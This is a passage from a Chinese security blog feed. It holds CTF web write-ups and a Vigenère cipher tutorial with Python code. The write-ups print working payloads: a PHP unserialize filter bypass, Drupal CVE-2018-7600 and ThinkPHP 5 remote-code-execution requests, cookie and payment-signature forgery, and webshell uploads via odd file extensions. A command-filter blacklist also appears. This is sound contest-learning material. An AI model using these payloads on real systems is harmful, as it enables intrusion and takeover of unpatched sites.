web应用，从而反弹shell，然后继续攻击内网web题目，使用tar提权查看flag，这思路很好，学到了。。。回去得看看Linux的提权骚操作了，只能说出题人真的tql…</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这个比赛Web真的很有质量，学到了很多东西
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>安恒12月赛Web题解</title>
    <link href="0verwatch.top/anheng-12month.html"/>
    <id>0verwatch.top/anheng-12month.html</id>
    <published>2018-12-22T04:58:05.000Z</published>
    <updated>2018-12-22T05:01:32.092Z</updated>
    
    <content type="html"><![CDATA[<h3 id="吐槽一下"><a href="#吐槽一下" class="headerlink" title="吐槽一下"></a>吐槽一下</h3><p>这次的web题目感觉完全是新手题，思路很直接，我就不掺和了，做完web就逃23333，继续完成密码学课程实验报告去了<a id="more"></a>。。。但还是记录一下。</p><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>这个题目考的是一个php反序列化的一个绕过，上来就给了一段代码，很简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>关键是绕过这一句，本意是为了防止对象被反序列化，可以参考一下这篇文章:<a href="https://blog.spoock.com/2016/11/03/php-wakeup/" target="_blank" rel="noopener">https://blog.spoock.com/2016/11/03/php-wakeup/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br></pre></td></tr></table></figure><p>所以只需要只需要在对象长度前添加一个<code>+</code>号，即<code>o:14-&gt;o:+14</code>，这样就可以绕过正则匹配。最后的payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+<span class="number">4</span>:<span class="string">"baby"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>url编码后发包就可以获得flag:<code>flag{ad2328a2c3f0933c053fd3c6f28f6143}</code></p><p><img src="https://s1.ax1x.com/2018/12/22/FySZ1H.png" alt="FySZ1H.png"></p><h3 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2"></a>ezweb2</h3><p>这个题目上来发现没什么线索，只能扫一下目录，发现了一个<code>admin.php</code>，但是进去却回显<code>You are not admin...</code>，这样思路就很明确了，我们需要伪造admin的身份，查一下cookie，果然需要伪造一下，把cookie的值从<code>user</code>-&gt;<code>admin</code>就好，还需base64一下</p><p><img src="https://s1.ax1x.com/2018/12/22/FySHvd.png" alt="FySHvd.png"></p><p>然后就可以进入一个命令执行的页面,输入<code>ls</code>发现有回显，但是很多东西都被过滤了</p><p><img src="https://s1.ax1x.com/2018/12/22/FySObt.png" alt="FySObt.png"></p><p><img src="https://s1.ax1x.com/2018/12/22/Fyphss.png" alt="Fyphss.png"></p><p>可以尝试一下读文件，在<code>config.php</code>发现黑名单</p><p>admin.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'admin'</span>])||$_SESSION[<span class="string">'admin'</span>]===<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"You are not admin..."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">$retval = <span class="keyword">array</span>();</span><br><span class="line">exec($cmd, $retval, $status);</span><br><span class="line"><span class="comment">// var_dump($retval);</span></span><br><span class="line"><span class="keyword">if</span> ($status == <span class="number">0</span>) &#123;</span><br><span class="line">$res = implode(<span class="string">"\n"</span>,$retval);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$res = <span class="string">'error'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$res = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'./templates/admin.html'</span>;</span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+| )/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键是如何绕过这个黑名单去读到flag，这里已经把很多东西都过滤了，但是<code>$</code>以及<code>/</code>都没被过滤，可以很好地执行命令</p><p><img src="https://s1.ax1x.com/2018/12/22/FypvLR.png" alt="FypvLR.png"></p><p>成功读取flag:<code>flag{6f1d95159e3b90ed28186c518dd15e8c}</code></p><p><img src="https://s1.ax1x.com/2018/12/22/Fypze1.png" alt="Fypze1.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;吐槽一下&quot;&gt;&lt;a href=&quot;#吐槽一下&quot; class=&quot;headerlink&quot; title=&quot;吐槽一下&quot;&gt;&lt;/a&gt;吐槽一下&lt;/h3&gt;&lt;p&gt;这次的web题目感觉完全是新手题，思路很直接，我就不掺和了，做完web就逃23333，继续完成密码学课程实验报告去了
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>维吉尼亚密码原理及Python实现</title>
    <link href="0verwatch.top/Virginia-python.html"/>
    <id>0verwatch.top/Virginia-python.html</id>
    <published>2018-12-21T08:17:06.000Z</published>
    <updated>2019-02-08T10:15:40.128Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单<a id="more"></a>形式。</p><h3 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h3><ol><li>加密过程:明文字母p对应的列和秘钥字母k对应的行的交叉点就是加密字母后的密文字母</li><li>解密过程:在密钥字母k对应的行找到对应密文字母，则该密文字母对应的列的字母就是明文字母</li></ol><p>下图就是维吉尼亚密码的表格，我们需要构造这样的一个表去查，代码是将其变成了一维的形式然后实现的</p><p><img src="https://s2.ax1x.com/2019/01/01/F5UNH1.png" alt="F5UNH1.png"></p><h3 id="核心代码及分析"><a href="#核心代码及分析" class="headerlink" title="核心代码及分析"></a>核心代码及分析</h3><p>字母的偏移问题，我这里是分开大小写字母进行加解密的，也就是说大写加解密后还是大写，小写加解密后还是小写，然后从26个字母里面选择，所以必须注意边界问题，需要对26取余。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">letter_list = string.ascii_uppercase</span><br><span class="line">letter_list2 = string.ascii_lowercase</span><br></pre></td></tr></table></figure><p>代码只对字母进行加解密，代码里面需要注意的是一下细节问题，比如在密钥使用完过后需要循环使用，这里用的是取余加上一个标记flag去实现，然后从字母列表里面选取对应的字母即可。加解密代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span><span class="params">(message,key)</span>:</span></span><br><span class="line">    ciphertext = <span class="string">""</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    key_list = key</span><br><span class="line">    <span class="keyword">for</span> plain <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span> flag % len(key_list) == <span class="number">0</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> plain.isalpha(): <span class="comment">#判断是否为英文</span></span><br><span class="line">            <span class="keyword">if</span> plain.isupper():</span><br><span class="line">                ciphertext += letter_list[(ord(plain) - <span class="number">65</span> + key_list[flag]) % <span class="number">26</span>] <span class="comment">#行偏移加上列偏移</span></span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> plain.islower():</span><br><span class="line">                ciphertext += letter_list2[(ord(plain) - <span class="number">97</span> + key_list[flag]) % <span class="number">26</span>]</span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:<span class="comment">#不是英文不加密</span></span><br><span class="line">            ciphertext += plain</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(message,key)</span>:</span></span><br><span class="line">    plaintext = <span class="string">""</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    key_list = key</span><br><span class="line">    <span class="keyword">for</span> cipher <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span> flag % len(key_list) == <span class="number">0</span>:</span><br><span class="line">            flag  = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> cipher.isalpha():</span><br><span class="line">            <span class="keyword">if</span> cipher.isupper():</span><br><span class="line">                plaintext += letter_list[(ord(cipher) - <span class="number">65</span> - key_list[flag]) %<span class="number">26</span>]</span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> cipher.islower():</span><br><span class="line">                plaintext += letter_list2[(ord(cipher) - <span class="number">97</span> - key_list[flag]) % <span class="number">26</span>]</span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext += cipher</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br></pre></td></tr></table></figure><h3 id="正确性"><a href="#正确性" class="headerlink" title="正确性"></a>正确性</h3><p>这里以输入”helloworld”为例，然后进行加解密，能够正确完成</p><p><img src="https://s2.ax1x.com/2019/01/01/F5UGjJ.png" alt="F5UGjJ.png"></p><h3 id="详细代码-放在github上了-：维吉尼亚密码"><a href="#详细代码-放在github上了-：维吉尼亚密码" class="headerlink" title="详细代码(放在github上了)：维吉尼亚密码"></a>详细代码(放在github上了)：<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">维吉尼亚密码</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单
    
    </summary>
    
      <category term="密码学" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>CUMT第一轮双月赛Web题解</title>
    <link href="0verwatch.top/CUMT-month-race.html"/>
    <id>0verwatch.top/CUMT-month-race.html</id>
    <published>2018-12-16T12:05:32.000Z</published>
    <updated>2018-12-17T14:40:23.753Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h3><p>这个题目作为Web题的第一个题难度刚好，很基础的漏洞点，就考了个文件上传，上来直接用phtml就可以绕过，但是给出来的hint是.htaccess,可能是我非预<a id="more"></a>期了？</p><p><a href="https://imgchr.com/i/Fa0BnI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa0BnI.png" alt="Fa0BnI.png"></a></p><p>菜刀链接获取flag</p><p><a href="https://imgchr.com/i/Fa0rHP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa0rHP.png" alt="Fa0rHP.png"></a></p><h3 id="Cve"><a href="#Cve" class="headerlink" title="Cve"></a>Cve</h3><p>参考了这篇文章：<code>https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#代码执行现场</code></p><p>这是一个Drupal 7的cve，照着构造payload就好，payload 分为两个请求。 先将 Payload 注入缓存中，构造下面的payload，发送一个POST包</p><p>POST请求：<code>/?q=user/password&amp;name[%23post_render][]=system&amp;name[%23type]=markup&amp;name[%23markup]=ls%20/</code></p><p>POST内容：<code>form_id=user_pass&amp;_triggering_element_name=name</code></p><p>获取form_build_id的value值：</p><p><a href="https://imgchr.com/i/FayX0s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FayX0s.png" alt="FayX0s.png"></a></p><p>然后再POST发送执行的包：<code>/?q=file/ajax/name/%23value/form-b7pP9HUKwcQBEuhZ1GZ79qWXV0KRb5YxUGoWaozSPRU</code>这里也需要form_build_id的值，POST的内容也是：<code>form_build_id=form-b7pP9HUKwcQBEuhZ1GZ79qWXV0KRb5YxUGoWaozSPRU</code>成功执行命令，这里注意一下参考文章里面的<code>passthru</code>命令用不了，只能改为<code>system</code>才能执行相关命令,所以上面缓存的时候换了用<code>system</code>函数</p><p><a href="https://imgchr.com/i/Fa6knJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa6knJ.png" alt="Fa6knJ.png"></a></p><p>再来一次<code>cat /flag</code>的操作就可以读取flag了</p><p><a href="https://imgchr.com/i/Fa66Nq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa66Nq.png" alt="Fa66Nq.png"></a></p><h3 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h3><p>这个题是个代码审计的题目，先把源码给down下来</p><p>打开这个网站发现有登陆注册功能，以及购买flag的功能，但是这里面要想得到真正的flag却需要888积分才可以购买，这个时候就感觉应该是越权购买flag的漏洞了。。。。</p><p>发现源码里面有数据库文件打开看一下，发现是存在管理员的，并且id是16，这个东西后期有用，而且他有30000积分，够买很多flag了，还有商品id 38也可以得知</p><p><a href="https://imgchr.com/i/FaNVu6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNVu6.md.png" alt="FaNVu6.md.png"></a></p><p><a href="https://imgchr.com/i/FaNeHO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNeHO.png" alt="FaNeHO.png"></a></p><p>看到代码里面的setting文件，有从secret.key读出来的秘钥</p><p><a href="https://imgchr.com/i/FaNuUe" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNuUe.md.png" alt="FaNuUe.md.png"></a></p><p>看一下里面的秘钥，一定要注意这里还有个回车啊啊啊啊，后边伪造签名有用</p><p><a href="https://imgchr.com/i/FaN1gI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaN1gI.png" alt="FaN1gI.png"></a></p><p>重点关注这段代码</p><p><a href="https://imgchr.com/i/FaN3vt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaN3vt.md.png" alt="FaN3vt.md.png"></a></p><p>这里可以看出单单对商品方做了校验(自检验)，那购买者呢？不存在对其的任何校验，也就是没有做好双向的校验，这也说明我们可以从伪造购买者的方面去入手，让别人付钱23333</p><p>根据它里面的代码去构造signature就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = <span class="string">'zhinianyuxin\n'</span></span><br><span class="line">form = &#123;</span><br><span class="line"><span class="string">'order_id'</span>: <span class="string">'119'</span>,</span><br><span class="line"><span class="string">'buyer_id'</span>: <span class="string">'16'</span>,  </span><br><span class="line"><span class="string">'good_id'</span>: <span class="string">'38'</span>,   </span><br><span class="line"><span class="string">'buyer_point'</span>: <span class="string">'200'</span>,</span><br><span class="line"><span class="string">'good_price'</span>: <span class="string">'50'</span>,</span><br><span class="line"><span class="string">'order_create_time'</span>: <span class="string">'1544796662.686132'</span></span><br><span class="line">&#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form])</span><br><span class="line">str2sign3= str2sign.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">sign = md5(str2sign3).hexdigest()</span><br><span class="line">print(sign)</span><br></pre></td></tr></table></figure><p>发包构造一下得到flag,注意红色的地方也要做相应的修改，发包得到flag</p><p><a href="https://imgchr.com/i/FaNoKx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNoKx.png" alt="FaNoKx.png"></a></p><p><a href="https://imgchr.com/i/FaNjGd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNjGd.png" alt="FaNjGd.png"></a></p><h3 id="tp5"><a href="#tp5" class="headerlink" title="tp5"></a>tp5</h3><p>这个题目就是最近几天刚爆出来的tp5远程getshell的漏洞，直接上网搜payload，参考了这篇文章:<a href="https://mp.weixin.qq.com/s/NQAZPz8uT8eNFyeMT4l8Ig" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NQAZPz8uT8eNFyeMT4l8Ig</a></p><p>我用的是下面的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p>最后获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/FaBebt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaBebt.png" alt="FaBebt.png"></a></p><h3 id="secret-system"><a href="#secret-system" class="headerlink" title="secret-system"></a>secret-system</h3><p>一进去之后会发现login功能没反应，而upload页面也需要管理员权限，肯定是要伪造自己是管理员的身份然后去挖掘文件上传的漏洞，查看源代码无果后顺手看看<code>robots.txt</code>,发现里面有登录的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: index.php?r=site/loginuser_1</span><br></pre></td></tr></table></figure><p>然后就可以进去登陆的页面，再次查看源代码发现作者的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">*** author: cib_zhinianyuxin.com</span><br><span class="line">*** code: github.com</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>顺手去查一下,发现可以用<code>test/cib_sec</code>登录但不是<code>admin</code>，而且泄露的代码里面说明了可以伪造cookie，cookie名称是Cib_security，是一段经过序列化的东西，到时候就可以伪造了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">##README.md</span><br><span class="line"></span><br><span class="line">    *** author: cib_zhinianyuxin.com</span><br><span class="line"></span><br><span class="line">It&apos;s just a system which is not completed , there are some tips:</span><br><span class="line"></span><br><span class="line">    you can use test/cib_sec to login ,but you are not admin!</span><br><span class="line">    only admin can upload file ,but whichone can not bypass my rules.</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">$sign = array(</span><br><span class="line">                    &apos;id&apos;=&gt;$model-&gt;id,</span><br><span class="line">                    &apos;name&apos;=&gt;$model-&gt;username,</span><br><span class="line">                    &apos;sign&apos;=&gt;md5($model-&gt;id.$model-&gt;username),</span><br><span class="line">                );</span><br><span class="line">$_COOKIE[&apos;Cib_security&apos;] = serialize($sign);</span><br><span class="line">**/</span><br></pre></td></tr></table></figure><p>以test身份登录后把cookie拿出来然后解码</p><p><a href="https://imgchr.com/i/FadGK1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FadGK1.md.png" alt="FadGK1.md.png"></a></p><p>然后把里面的MD5解一下发现是<code>2test</code>,那我们就构造一个<code>1admin</code>，构造如下的序列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3&#123;s:2:&quot;id&quot;;i:1;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;sign&quot;;s:32:&quot;6c5de1b510e8bdd0bc40eff99dcd03f8&quot;;&#125;</span><br></pre></td></tr></table></figure><p>再次经过URL编码然后保存一下cookie就可以以admin身份登录，接上来就是文件上传的部分了，这里的文件上传就是个很简单的后缀名绕过，我试了贼久，这个后缀名有点偏，用的<code>pht</code>,然后发包上传一句话木马，菜刀链接，成功获取flag</p><p><a href="https://imgchr.com/i/FawmQA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FawmQA.png" alt="FawmQA.png"></a></p><h3 id="shell"><a href="#shell" class="headerlink" title="shell?"></a>shell?</h3><p>这个题目确实拓宽了新思路，做了好久才做出来由于特殊原因呢，就不发详细writeup了。。。。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这一次把web给ak了，真是舒服呐23333，截个图留念一下</p><p><img src="https://s1.ax1x.com/2018/12/16/Fd5Lpd.png" alt="Fd5Lpd.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ez-upload&quot;&gt;&lt;a href=&quot;#ez-upload&quot; class=&quot;headerlink&quot; title=&quot;ez-upload&quot;&gt;&lt;/a&gt;ez-upload&lt;/h3&gt;&lt;p&gt;这个题目作为Web题的第一个题难度刚好，很基础的漏洞点，就考了个文件上传，上来直接用phtml就可以绕过，但是给出来的hint是.htaccess,可能是我非预
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>安恒11月赛Web题目复现</title>
    <link href="0verwatch.top/anheng-11month.html"/>
    <id>0verwatch.top/anheng-11month.html</id>
    <published>2018-11-30T08:37:25.000Z</published>
    <updated>2018-11-30T08:43:36.319Z</updated>
    
    <content type="html"><![CDATA[<p>考完网络安全跟算法就赶紧来复现一下题目，又学到了一波知识了<a id="more"></a>23333，这次题目的质量贼好</p><h3 id="手速要快"><a href="#手速要快" class="headerlink" title="手速要快"></a>手速要快</h3><p>上一个月的原题，不多说，直接在http头里面找到对应的password登陆以后直接就是关于页面上传的功能，这里的上传是服务器端的问题<br>直接上传一个非<code>php</code>结尾的文件即可解析<br><a href="https://imgchr.com/i/FmMnPS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmMnPS.md.png" alt="FmMnPS.md.png"></a><br>然后可以直接输入相关命令获取flag不多说<br><img src="https://s1.ax1x.com/2018/11/30/FmMMvj.png" alt="FmMMvj.png"></p><p><a href="https://imgchr.com/i/FmM1rn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmM1rn.md.png" alt="FmM1rn.md.png"></a></p><h3 id="好黑的黑名单"><a href="#好黑的黑名单" class="headerlink" title="好黑的黑名单"></a>好黑的黑名单</h3><p>这个题目质量很好，至少我以前都没见过这种盲注，里面利用了between的几个特性，又学到了2333<br>右键查看源代码就会发现很明显的<code>id</code>参数，这里的思路就是<code>SQL注入</code><br><img src="https://s1.ax1x.com/2018/11/30/FmM3bq.png" 